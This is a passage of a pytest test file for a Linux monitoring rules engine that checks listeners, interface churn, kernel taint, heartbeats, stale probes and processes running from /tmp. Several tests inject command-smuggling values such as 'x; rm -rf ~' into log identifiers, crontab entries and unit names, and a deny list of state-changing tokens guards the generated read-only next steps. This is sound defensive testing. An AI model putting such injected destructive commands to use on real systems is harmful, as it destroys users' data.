    after = listening(sock("tcp", "0.0.0.0", 22), sock("tcp", "0.0.0.0", 8000, "python3"),
                      sock("tcp", "::", 8000, "python3"), sock("tcp", "*", 40071, "devtool"))
    out = found(snap({"listeners": after}, {"listeners": before}), "listener.new_wildcard")
    assert [(f.entity, f.severity) for f in out] == [("listener:tcp/8000", Severity.WARN),
                                                     ("listener:tcp/40071", Severity.WARN)]
    assert out[0].evidence == {"addresses": ["0.0.0.0", "::"], "process": "python3"}


def test_standing_wildcard_listeners_are_not_re_raised():
    same = listening(sock("tcp", "0.0.0.0", 22), sock("udp", "0.0.0.0", 111))
    assert found(snap({"listeners": same}, {"listeners": same}), "listener.new_wildcard") == []


def test_listeners_without_a_previous_observation_are_the_baseline():
    s = snap({"listeners": listening(sock("tcp", "0.0.0.0", 22))})
    assert found(s, "listener.new_wildcard") == []


def test_new_loopback_listener_is_nothing():
    s = snap({"listeners": listening(sock("tcp", "127.0.0.1", 9000))},
             {"listeners": listening()})
    assert found(s, "listener.new_wildcard") == []


def test_new_udp_wildcard_warns_below_the_ephemeral_range_only():
    # Unconnected UDP client sockets (a browser may hold ten) sit on wildcard
    # ephemeral ports and churn; a server port below the range is a real new listener.
    after = listening(sock("udp", "0.0.0.0", 53, "dnsmasq"), sock("udp", "*", 32767),
                      sock("udp", "*", 32768, "firefox-bin"),
                      sock("udp", "*", 54169, "firefox-bin"))
    out = found(snap({"listeners": after}, {"listeners": listening()}), "listener.new_wildcard")
    assert [f.entity for f in out] == ["listener:udp/53", "listener:udp/32767"]


# --- interface churn --------------------------------------------------------------------------


def netdev(*names: str) -> dict:
    return {"interfaces": [{"name": n, "rx_bytes": 0, "tx_bytes": 0} for n in names],
            "count": len(names)}


def churn(latest: dict, previous: dict, interval: float) -> Snapshot:
    return Snapshot(now=NOW, latest={"net.dev": (NOW, latest)},
                    previous={"net.dev": (NOW - interval, previous)},
                    heartbeats=((NOW, beat()),), cadence={})


def test_veth_churn_from_a_crash_looping_container_is_watch():
    # One restart of a container: docker tears down its veth and creates a new one, 60 s apart.
    s = churn(netdev("lo", "enp5s0", "docker0", "veth8c2f1a3"),
              netdev("lo", "enp5s0", "docker0", "veth41d09be"), 60)
    f = only(s, "net.interface_churn")
    assert (f.severity, f.entity) == (Severity.WATCH, "net:interfaces")
    assert f.evidence == {"added": ["veth8c2f1a3"], "removed": ["veth41d09be"],
                          "added_count": 1, "removed_count": 1, "interval_s": 60,
                          "per_hour": 120.0, "limit_per_hour": 60}


def test_churn_exactly_at_60_per_hour_is_watch_and_just_below_is_nothing():
    assert len(found(churn(netdev("lo", "veth1"), netdev("lo"), 60), "net.interface_churn")) == 1
    assert found(churn(netdev("lo", "veth1"), netdev("lo"), 61), "net.interface_churn") == []


def test_stable_interfaces_are_nothing():
    same = netdev("lo", "enp5s0", "docker0")
    assert found(churn(same, same, 60), "net.interface_churn") == []


def test_churn_name_lists_are_capped_but_counts_are_not():
    s = churn(netdev(*(f"veth{i:02}" for i in range(30))), netdev(), 60)
    f = only(s, "net.interface_churn")
    assert len(f.evidence["added"]) == 20
    assert f.evidence["added"][0] == "veth00"
    assert (f.evidence["added_count"], f.evidence["removed"]) == (30, [])


def test_churn_without_previous_or_with_no_interval_or_bad_data_is_nothing():
    lone = Snapshot(now=NOW, latest={"net.dev": (NOW, netdev("veth1"))}, previous={},
                    heartbeats=((NOW, beat()),), cadence={})
    assert found(lone, "net.interface_churn") == []
    assert found(churn(netdev("veth1"), netdev(), 0), "net.interface_churn") == []
    assert found(churn(netdev("veth1"), netdev(), -60), "net.interface_churn") == []
    assert found(churn(netdev("veth1"), {"count": 0}, 60), "net.interface_churn") == []
    assert found(churn({"interfaces": [{"name": 5}, None]}, netdev(), 60),
                 "net.interface_churn") == []


# --- kernel -----------------------------------------------------------------------------------


def test_taint_change_is_watch():
    f = only(snap({"kernel.tainted": {"value": 4097, "flags": "PM"}},
                  {"kernel.tainted": {"value": 1, "flags": "P"}}), "kernel.taint_changed")
    assert (f.severity, f.entity) == (Severity.WATCH, "kernel:taint")
    assert f.evidence == {"value": 4097, "flags": "PM", "previous": 1, "previous_flags": "P"}


def test_taint_unchanged_or_first_seen_is_nothing():
    t = {"kernel.tainted": {"value": 1, "flags": "P"}}
    assert found(snap(t, t), "kernel.taint_changed") == []
    assert found(snap(t), "kernel.taint_changed") == []


def test_reboot_required_is_info():
    f = only(snap({"reboot.required": {"required": True, "packages": ["linux-base"]}}),
             "kernel.reboot_required")
    assert (f.severity, f.entity, f.evidence) == (
        Severity.INFO, "kernel:reboot", {"packages": ["linux-base"]})
    assert found(snap({"reboot.required": {"required": False, "packages": []}}),
                 "kernel.reboot_required") == []
    assert found(snap({"reboot.required": {}}), "kernel.reboot_required") == []


# --- heartbeats -------------------------------------------------------------------------------

LIMIT = 3 * CONFIG.cadence.fast


def test_a_heartbeat_gap_over_three_fast_cadences_is_critical():
    s = snap(heartbeats=((NOW - 500, beat()), (NOW - LIMIT - 1, beat())))
    f = only(s, "agent.stopped")
    assert (f.severity, f.entity) == (Severity.CRITICAL, "agent:collector")
    assert "stopped reporting" in f.title
    assert f.evidence == {"last_heartbeat_at": NOW - LIMIT - 1, "age_s": LIMIT + 1,
                          "limit_s": LIMIT}


def test_a_heartbeat_exactly_at_the_limit_is_nothing():
    assert found(snap(heartbeats=((NOW - LIMIT, beat()),)), "agent.stopped") == []


def test_newest_heartbeat_is_found_by_time_not_position():
    s = snap(heartbeats=((NOW - 5, beat()), (NOW - 900, beat())))
    assert found(s, "agent.stopped") == []


def test_no_heartbeats_at_all_is_critical_because_unknown_is_never_healthy():
    f = only(snap(heartbeats=()), "agent.stopped")
    assert f.evidence == {"last_heartbeat_at": None, "age_s": None, "limit_s": LIMIT}


def test_the_limit_follows_the_configured_fast_cadence():
    slow = dataclasses.replace(CONFIG, cadence=Cadence(fast=600))
    s = snap(heartbeats=((NOW - 1000, beat()),))
    assert found(s, "agent.stopped", slow) == []
    assert len(found(s, "agent.stopped")) == 1


def test_an_unconfined_newest_heartbeat_is_info():
    s = snap(heartbeats=((NOW - 60, beat()), (NOW - 1, beat(False, ("/", "/etc")))))
    f = only(s, "agent.unconfined")
    assert (f.severity, f.entity) == (Severity.INFO, "agent:collector")
    assert "unconfined" in f.title
    assert f.evidence == {"writable": ["/", "/etc"]}


def test_an_old_unconfined_heartbeat_superseded_by_a_confined_one_is_nothing():
    s = snap(heartbeats=((NOW - 60, beat(False, ("/",))), (NOW - 1, beat())))
    assert found(s, "agent.unconfined") == []
    assert found(snap(heartbeats=()), "agent.unconfined") == []


# --- staleness --------------------------------------------------------------------------------


def test_a_probe_older_than_three_cadences_is_stale():
    s = Snapshot(now=NOW, latest={"load": (NOW - 181, {}), "smart.sda": (NOW - 100, {})},
                 previous={}, heartbeats=((NOW, beat()),),
                 cadence={"load": 60, "smart.sda": 3600})
    f = only(s, "probe.stale")
    assert (f.severity, f.entity) == (Severity.WATCH, "probe:load")
    assert f.evidence == {"last_at": NOW - 181, "age_s": 181, "limit_s": 180}


def test_a_probe_exactly_at_three_cadences_is_fresh():
    s = Snapshot(now=NOW, latest={"load": (NOW - 180, {})}, previous={},
                 heartbeats=((NOW, beat()),), cadence={"load": 60})
    assert found(s, "probe.stale") == []


def test_an_expected_probe_never_observed_is_stale():
    s = snap(cadence={"sensors": 60})
    f = only(s, "probe.stale")
    assert (f.entity, f.evidence) == ("probe:sensors",
                                      {"last_at": None, "age_s": None, "limit_s": 180})


def test_observed_probes_with_no_expected_cadence_are_not_judged_stale():
    s = snap({"load": {}}, at=NOW - 10_000)
    assert found(s, "probe.stale") == []


# --- next steps: read-only, concrete, for every rule ------------------------------------------


def triggers() -> dict[str, Snapshot]:
    """One triggering snapshot per rule id. Must cover RULES exactly."""
    return {
        "edac.uncorrected": snap({"edac": edac(mc1=(0, 2))}),
        "edac.corrected": snap({"edac": edac(mc0=(5, 0))}, {"edac": edac(mc0=(3, 0))}),
        "smart.critical_warning": snap({"smart.nvme0n1": nvme(critical_warning=4)}),
        "smart.health_failed": snap({"smart.sda": nvme(passed=False)}),
        "smart.media_errors": snap({"smart.sda": nvme(media_errors=3)},
                                   {"smart.sda": nvme(media_errors=1)}),
        "smart.wear": snap({"smart.nvme0n1": nvme(percentage_used=95)}),
        "cpu.temperature": snap({"sensors": sensors(reading("k10temp-pci-00c3", "Tctl", 99.0))}),
        "drive.temperature": snap({"sensors": sensors(
            reading("nvme-pci-0600", "Composite", 80.0, crit=79.85))}),
        "gpu.temperature": snap({"gpu": {"gpus": [gpu(1, temperature_c=91)]}}),
        "gpu.throttle": snap({"gpu": {"gpus": [gpu(throttle=["hw_thermal_slowdown"])]}}),
        "gpu.pcie_degraded": snap({"gpu": {"gpus": [gpu(1, pcie_width=8)]}},
                                  {"gpu": {"gpus": [gpu(1, pcie_width=16)]}}),
        "disk.fill": snap({"disk.fill": fill(("/mnt/my disk", 98.0))}),
        "memory.oom_kill": snap({"vmstat": {"oom_kill": 2}}, {"vmstat": {"oom_kill": 1}}),
        "memory.pressure": snap({"psi.memory": {"full_avg60": 20.0}}),
        "container.crash_loop": snap({"containers": {"containers": [
            {"name": "shopfront-worker-1", "state": "restarting"}]}}),
        "unit.failed": snap({"units.failed": {"units": [{"unit": "a.service"}]}}),
        "journal.flood": snap({"journal.warnings": journal(500, True, {"openvpn.service": 500})}),
        "net.interface_churn": churn(netdev("veth8c2f1a3"), netdev("veth41d09be"), 60),
        "listener.new_wildcard": snap({"listeners": listening(sock("tcp", "0.0.0.0", 8000))},
                                      {"listeners": listening()}),
        "kernel.taint_changed": snap({"kernel.tainted": {"value": 1}},
                                     {"kernel.tainted": {"value": 0}}),
        "kernel.reboot_required": snap({"reboot.required": {"required": True, "packages": []}}),
        "security.hardlinks_unprotected": snap({"fs.protected_hardlinks": {"value": 0}}),
        "agent.stopped": snap(heartbeats=()),
        "agent.unconfined": snap(heartbeats=((NOW, beat(False, ("/",))),)),
        "probe.stale": snap(cadence={"sensors": 60}),
        "unit.restart_loop": loop(9, 1),
        "job.timer_failed": snap(jobs=[timer(result="exit-code")]),
        "job.runs_from_tmp": snap(jobs=[job(command="/tmp/x"), timer(command="/dev/shm/y")]),
        "job.crontab_flood": snap(jobs=[job(file="/etc/cron.d/a b", overflow=1)]),
        "process.runs_from_tmp": snap({"processes": {"from_tmp": [tmp_proc()]}}),
    }


#: Tokens that would change state if a person pasted the next step.
STATE_CHANGING = {"rm", "kill", "restart", "stop", "start", "enable", "disable", "mask",
                  "chmod", "chown", "mv", "dd", "tee", "reboot", "update", "pkill", "killall"}


def tokens(text: str) -> list[str]:
    lexer = shlex.shlex(text, posix=True, punctuation_chars=True)
    lexer.whitespace_split = True
    return list(lexer)


def test_every_registered_rule_has_a_trigger_here():
    assert set(triggers()) == set(rules.RULES)


@pytest.mark.parametrize("rule", sorted(rules.RULES))
def test_every_rule_gives_a_concrete_read_only_next_step(rule):
    hits = found(triggers()[rule], rule)
    assert hits, rule
    for f in hits:
        step = f.next_step
        assert step.strip(), rule
        assert ">" not in step and "<" not in step and "{" not in step, step  # no redirect or
        # placeholder left in
        words = {w.lower() for w in tokens(step)}
        assert not words & STATE_CHANGING, (rule, step)


def test_next_steps_carry_the_real_values():
    t = triggers()
    assert only(t["unit.failed"], "unit.failed").next_step == (
        "systemctl status a.service --no-pager; journalctl -u a.service -n 100 --no-pager")
    assert only(t["container.crash_loop"], "container.crash_loop").next_step == (
        "docker logs --tail 100 shopfront-worker-1; docker inspect shopfront-worker-1")
    assert only(t["smart.health_failed"], "smart.health_failed").next_step == (
        "sudo smartctl -a /dev/sda")
    assert "df -h '/mnt/my disk'" in only(t["disk.fill"], "disk.fill").next_step
    assert "cat /proc/pressure/memory" in only(t["memory.pressure"], "memory.pressure").next_step
    assert only(t["net.interface_churn"], "net.interface_churn").next_step.startswith(
        "ip -o link show type veth")
    assert only(t["listener.new_wildcard"], "listener.new_wildcard").next_step == (
        "sudo ss -ltnup 'sport = :8000'")
    assert "journalctl -n 50 --no-pager" in only(t["agent.stopped"], "agent.stopped").next_step
    assert "sensors" in only(t["probe.stale"], "probe.stale").next_step
    assert only(t["unit.restart_loop"], "unit.restart_loop").next_step == (
        "systemctl status openvpn.service --no-pager; "
        "journalctl -u openvpn.service -n 100 --no-pager")
    assert only(t["job.timer_failed"], "job.timer_failed").next_step == (
        "systemctl status backup.service --no-pager; "
        "journalctl -u backup.service -n 100 --no-pager")
    assert only(t["job.crontab_flood"], "job.crontab_flood").next_step == (
        "sudo wc -l '/etc/cron.d/a b'")
    cron, timed = found(t["job.runs_from_tmp"], "job.runs_from_tmp")
    assert cron.next_step == "sudo cat /var/spool/cron/crontabs/alice; sudo ls -la /tmp/x"
    assert timed.next_step == "systemctl cat backup.service --no-pager; sudo ls -la /dev/shm/y"


def test_untrusted_names_are_quoted_so_a_pasted_step_stays_one_command():
    # Any local user can set a syslog identifier: `logger -t 'x; rm -rf ~' hi`.
    hostile = "x; rm -rf ~"
    f = only(snap({"journal.warnings": journal(500, True, {hostile: 500})}), "journal.flood")
    assert hostile in shlex.split(f.next_step)
    assert not {w.lower() for w in tokens(f.next_step)} & STATE_CHANGING


def test_a_crontab_path_or_unit_name_is_quoted_too():
    # Any user can write a crontab, and name the program it runs; a unit name is quoted too.
    record = job(command="'/tmp/x;rm -rf ~'", file="/etc/cron.d/a b")
    loud = service("x; rm -rf ~.service", restarts=9)
    hits = [*found(snap(jobs=[record]), "job.runs_from_tmp"),
            *found(snap(services=[loud], previous_services=[{**loud, "restarts": 0}]),
                   "unit.restart_loop")]
    assert len(hits) == 2
    for f in hits:
        assert not {w.lower() for w in tokens(f.next_step)} & STATE_CHANGING, f.next_step
    assert {"/tmp/x;rm", "/etc/cron.d/a b"} <= set(tokens(hits[0].next_step))
    assert "x; rm -rf ~.service" in tokens(hits[1].next_step)


def test_a_rule_error_says_what_to_do():
    def broken(snapshot: Snapshot, config: Config):
        raise KeyError("boom")

    with pytest.MonkeyPatch.context() as mp:
        mp.setitem(rules.RULES, "test.broken", broken)
        error = only(snap(), "rules.error")
    assert "test.broken" in error.next_step


# --- process.runs_from_tmp ---------------------------------------------------------------------


def tmp_proc(pid: int = 3320260, *, args: str = "/tmp/go-build123/b001/exe/main --serve",
             user: str = "alice", ns: str | None = "host", ppid: int = 3320257) -> dict:
    return {"pid": pid, "ppid": ppid, "user": user, "state": "R", "cpu_pct": 529.0,
            "rss_kb": 91012, "elapsed_s": 0, "threads": 32, "cpu_s": 2, "comm": "main",
            "args": args, "pid_ns": ns}


def test_a_program_running_from_tmp_is_a_finding_about_that_process_with_its_row():
    f = only(snap({"processes": {"from_tmp": [tmp_proc()]}}, at=NOW - 30),
             "process.runs_from_tmp")
    assert f.severity is Severity.WARN and f.entity == "process:3320260"
    assert f.title == "A program is running from /tmp: /tmp/go-build123/b001/exe/main"
    assert f.evidence == {"program": "/tmp/go-build123/b001/exe/main",
                          "args": "/tmp/go-build123/b001/exe/main --serve", "user": "alice",
                          "pid": 3320260, "ppid": 3320257, "pid_ns": "host", "elapsed_s": 0,
                          "cpu_pct": 529.0, "threads": 32, "rss_kb": 91012,
                          "seen_at": NOW - 30}
    # The step still says something once the process is gone: its parent, and the journal
    # around the moment it was seen.
    at = int(NOW - 30)
    assert f.next_step == (f"ps -o pid,ppid,user,lstart,args -p 3320260,3320257; journalctl "
                           f"--since @{at - 60} --until @{at + 10} -o short-iso --no-pager "
                           f"| tail -n 40")
    assert "swapped" in f.why and "go test" in f.why


def test_root_on_the_host_is_critical_and_a_container_is_named_and_stays_warn():
    root = only(snap({"processes": {"from_tmp": [tmp_proc(user="root")]}}),
                "process.runs_from_tmp")
    assert root.severity is Severity.CRITICAL
    boxed = only(snap({"processes": {"from_tmp": [tmp_proc(user="root", ns="separate")]}}),
                 "process.runs_from_tmp")
    assert boxed.severity is Severity.WARN
    assert boxed.title.startswith("A program is running from /tmp in a container or sandbox")
    unknown = only(snap({"processes": {"from_tmp": [tmp_proc(user="root", ns=None)]}}),
                   "process.runs_from_tmp")
    assert unknown.severity is Severity.WARN


def test_the_directory_is_named_a_long_path_is_cut_and_findings_are_capped():
    shm = only(snap({"processes": {"from_tmp": [tmp_proc(args="/dev/shm/x")]}}),
               "process.runs_from_tmp")
    assert shm.title == "A program is running from /dev/shm: /dev/shm/x"
    long = "/tmp/" + "d" * 200 + "/bin"
    cut = only(snap({"processes": {"from_tmp": [tmp_proc(args=long)]}}), "process.runs_from_tmp")
    assert cut.title.endswith("…" + long[-(rules.TITLE_PATH_CHARS - 1):])
    assert cut.evidence["program"] == long
    many = [tmp_proc(pid=100 + i) for i in range(rules.PROCESS_FINDINGS + 5)]
    assert len(found(snap({"processes": {"from_tmp": many}}), "process.runs_from_tmp")) == \
        rules.PROCESS_FINDINGS


def test_no_parent_and_malformed_rows_and_no_snapshot():
    orphan = tmp_proc()
    orphan["ppid"] = None
    f = only(snap({"processes": {"from_tmp": [orphan, {"pid": "x"}, "junk"]}}),
             "process.runs_from_tmp")
    assert f.next_step.startswith("ps -o pid,ppid,user,lstart,args -p 3320260; ")
    assert found(snap({}), "process.runs_from_tmp") == []
    assert found(snap({"processes": {"from_tmp": []}}), "process.runs_from_tmp") == []
